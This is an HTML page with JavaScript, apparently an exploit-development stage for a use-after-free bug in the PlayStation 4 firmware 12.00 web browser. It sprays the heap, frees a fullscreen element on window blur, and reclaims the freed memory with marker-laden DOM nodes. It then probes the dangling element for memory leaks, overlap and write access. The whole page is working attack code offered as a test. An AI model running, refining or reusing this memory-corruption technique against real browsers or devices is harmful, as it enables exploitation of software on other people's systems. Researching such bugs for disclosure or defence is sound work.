
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - UAF Stage: Leak + Overlap</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>PS4 12.00 - UAF Leak Stage</h2>
<button onclick="runTest()">Run Test</button>

<script>

// ==========================
// 🔒 LOG SEGURO
// ==========================
let logBuffer = [];
function log(msg){
    try{console.log(msg);}catch(e){}
    logBuffer.push(msg);
}

// ==========================
// HEAP SETUP
// ==========================
function setupHeap(){
    let arr=[];
    for(let i=0;i<5000;i++){
        let t=new Float64Array(8);
        t[0]=i;
        arr.push(t);
    }
    return arr;
}

// ==========================
// FULLSCREEN
// ==========================
function setupFullscreen(){
    let fsTarget=document.createElement("div");

    fsTarget.innerHTML="<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";

    Object.assign(fsTarget.style,{
        background:"black",
        width:"100%",
        height:"100%",
        position:"absolute",
        top:"0",
        left:"0"
    });

    document.body.appendChild(fsTarget);

    fsTarget.webkitRequestFullscreen?.();

    return fsTarget;
}

// ==========================
// 🔥 RECLAIM CONTROLADO + MARKERS
// ==========================
function preciseReclaim(size){
    log("[*] Reclaim size = "+size);

    let bucket=[];

    // churn
    for(let i=0;i<3000;i++){
        let el=document.createElement("div");
        document.body.appendChild(el);
        el.remove();
    }

    for(let i=0;i<size;i++){

        let el;

        // 90% controlado (mantém slot)
        if(i % 10 !== 0){

            el=document.createElement("div");

            el.innerHTML=
                "<h1 style='margin-top:20%;text-align:center;'>CTRL_"+i+
                "_41414141_42424242_43434343<br>Press OPTIONS</h1>";

        }
        // 10% variação leve
        else{
            if(i % 20 === 0){
                el=document.createElement("svg");
                el.innerHTML="<circle cx='50' cy='50' r='40'></circle>";
            }else{
                el=document.createTextNode("TXT_"+i+"_BBBB");
                document.body.appendChild(el);
                bucket.push(el);
                continue;
            }
        }

        Object.assign(el.style,{
            background:"black",
            width:"100%",
            height:"100%",
            position:"absolute",
            top:"0",
            left:"0"
        });

        document.body.appendChild(el);
        bucket.push(el);
    }

    return bucket;
}

// ==========================
// 🔬 LEAK + OVERLAP SCAN
// ==========================
function deepProbe(fsTarget){

    log("---- DEEP PROBE ----");

    let html="";

    try{
        html=fsTarget.innerHTML;
        log("[CHECK] innerHTML = "+html);

        // 🔥 DETECÇÃO DE CONTROLE
        if(html.includes("CTRL_")){
            log("[!!!] REUSE CONTROLADO CONFIRMADO");
        }

    }catch(e){
        log("[UAF] innerHTML crash");
    }

    // 🔥 LEAK SCAN
    try{

        let txt=fsTarget.textContent || "";

        log("[LEAK] len = "+txt.length);

        let preview=txt.substring(0,120);
        log("[LEAK] preview = "+preview);

        // markers
        if(txt.includes("41414141") ||
           txt.includes("42424242") ||
           txt.includes("43434343")){
            log("[!!!] POSSIVEL LEAK REAL (MARKER)");
        }

        // 🔥 OVERLAP DETECTION
        let weird=false;

        for(let i=0;i<txt.length;i++){
            let c=txt.charCodeAt(i);

            // ASCII fora do esperado
            if(c < 32 || c > 126){
                weird=true;
                break;
            }
        }

        if(weird){
            log("[!!!] POSSIVEL OVERLAP / MEMORIA ESTRANHA");
        }else{
            log("[SCAN] ASCII normal");
        }

    }catch(e){
        log("[LEAK] crash leitura");
    }

    // estabilidade
    try{
        log("[CHECK] parent = "+fsTarget.parentNode);
    }catch(e){}

    try{
        let r=fsTarget.getBoundingClientRect();
        log("[CHECK] rect = "+r.height);
    }catch(e){
        log("[UAF] rect crash");
    }

    try{
        fsTarget.innerHTML="A";
        log("[PWN] write OK");
    }catch(e){
        log("[PWN] write crash");
    }
}

// ==========================
// TRIGGER
// ==========================
function trigger(fsTarget){

    log("[*] Trigger");

    try{
        fsTarget.remove();

        if(document.webkitIsFullScreen || document.fullscreenElement){
            document.webkitExitFullscreen?.();
        }

    }catch(e){
        log("[ERRO]");
    }

    let sizes=[1800,2000,2200,2500];

    sizes.forEach((s,i)=>{
        setTimeout(()=>preciseReclaim(s),i*60);
    });

    // probes
    setTimeout(()=>deepProbe(fsTarget),20);
    setTimeout(()=>deepProbe(fsTarget),80);
    setTimeout(()=>deepProbe(fsTarget),140);
    setTimeout(()=>deepProbe(fsTarget),220);

    // dump
    setTimeout(()=>{
        alert(logBuffer.join("\n"));
    },400);

    setTimeout(()=>location.reload(),600);
}

// ==========================
// MAIN
// ==========================
function runTest(){

    log("[*] Iniciando teste");

    setupHeap();

    let fsTarget=setupFullscreen();

    window.onblur=function(){
        log("[*] onblur");
        setTimeout(()=>trigger(fsTarget),3000);
    };
}

</script>

</body>
</html>
